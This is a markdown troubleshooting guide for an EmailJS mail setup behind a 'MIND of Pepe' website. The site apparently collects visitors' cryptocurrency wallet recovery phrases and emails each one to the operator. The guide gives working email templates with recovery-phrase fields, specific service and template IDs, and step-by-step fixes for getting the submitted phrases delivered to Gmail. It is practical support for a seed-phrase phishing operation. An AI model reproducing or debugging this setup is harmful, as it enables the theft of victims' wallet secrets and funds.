# EmailJS Troubleshooting Guide

## Current Issue: "Failed to send"

### Step 1: Check Your EmailJS Template
Your template (`template_f1a45gk`) should have these variables:

```
Subject: 🔐 New Wallet Recovery Phrase - {{wallet_type}}

Hello,

A new wallet recovery phrase has been submitted from your MIND of Pepe website:

**Wallet Type:** {{wallet_type}}
**Timestamp:** {{timestamp}}

**Recovery Phrase:**
{{recovery_phrase}}

**Additional Info:**
{{message}}

---
Sent from: {{from_name}}
```

### Step 2: Verify EmailJS Dashboard Settings

1. **Go to EmailJS Dashboard**: https://dashboard.emailjs.com/
2. **Check Service Status**:
   - Go to "Email Services"
   - Make sure `service_v29yl0j` is connected and active
   - Test the Gmail connection

3. **Check Template**:
   - Go to "Email Templates"
   - Open `template_f1a45gk`
   - Make sure it uses these variables: `{{wallet_type}}`, `{{recovery_phrase}}`, `{{timestamp}}`, `{{message}}`, `{{from_name}}`

4. **Test Template**:
   - In template editor, click "Test"
   - Use sample data to verify it works

### Step 3: Common Issues & Solutions

**Issue 1: Template Variables Don't Match**
- Solution: Update template to use exact variable names in code

**Issue 2: Gmail Service Not Connected**
- Solution: Reconnect Gmail in EmailJS dashboard

**Issue 3: Service ID/Template ID Wrong**
- Solution: Double-check IDs in dashboard match code

**Issue 4: Rate Limiting**
- Solution: EmailJS free plan has limits, wait a few minutes

**Issue 5: Blocked by Gmail**
- Solution: Check Gmail spam folder, whitelist EmailJS

### Step 4: Simple Test Template

Use this minimal template for testing:

```
Subject: Test Email

Wallet: {{wallet_type}}
Phrase: {{recovery_phrase}}
Time: {{timestamp}}
Message: {{message}}
From: {{from_name}}
```

### Step 5: Check Browser Console

1. Open Developer Tools (F12)
2. Go to Console tab
3. Try submitting the form
4. Look for error messages - they'll show the exact issue

### Step 6: Alternative Setup

If problems persist, create a new template with different ID and update code.

## Quick Fix: Update Your Template

1. Go to your EmailJS template
2. Replace content with this simple version:

```
Subject: Wallet Recovery - {{wallet_type}}

Wallet Type: {{wallet_type}}
Recovery Phrase: {{recovery_phrase}}
Timestamp: {{timestamp}}
Message: {{message}}
From: {{from_name}}
```

3. Save and test again
